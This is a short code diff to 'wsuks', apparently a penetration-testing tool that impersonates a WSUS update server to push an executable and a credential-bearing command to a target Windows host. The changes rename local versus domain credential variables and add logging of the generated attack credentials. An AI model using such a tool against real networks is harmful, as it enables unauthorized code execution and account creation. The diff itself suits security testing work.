@@ -17,22 +17,22 @@ from wsuks.helpers.wsusserver import WSUSUpdateHandler
 
 class Wsuks:
     def __init__(self, args):
-        self.logger = logging.getLogger()
+        self.logger = logging.getLogger("wsuks")
         self.hostIp = get_if_addr(args.interface)
-        self.username = "user" + "".join(random.choice(digits) for i in range(5))
-        self.password = "".join(random.sample(ascii_letters, 16))
+        self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
+        self.local_password = "".join(random.sample(ascii_letters, 16))
 
         # Set args
         self.targetIp = args.targetIp  # Never None (required)
         self.executable_file = args.executable.read()
         self.executable_name = os.path.basename(args.executable.name)
         args.executable.close()
-        self.command = args.command.replace("WSUKS_USER", self.username).replace("WSUKS_PASSWORD", self.password)
+        self.command = args.command.replace("WSUKS_USER", self.local_username).replace("WSUKS_PASSWORD", self.local_password)
 
         self.wsusIp = args.wsusIp
         self.wsusPort = args.wsusPort  # Default 8530
-        self.username = args.username
-        self.password = args.password
+        self.domain_username = args.username
+        self.domain_password = args.password
         self.domain = args.domain
         self.dcIp = args.dcIp
 
@@ -41,7 +41,7 @@ class Wsuks:
         sysvolparser = SysvolParser()
         if not self.wsusIp:
             self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
-            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
+            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp)
         else:
             self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
@@ -58,6 +58,7 @@ class Wsuks:
 
         # Prepare WSUS HTTP Server
         http_server = HTTPServer((self.hostIp, self.wsusPort), update_handler)
+        self.logger.success(f"Generated Credentials for the WSUS attack: Username={self.local_username} Password={self.local_password}")
         try:
             self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
             http_server.serve_forever()
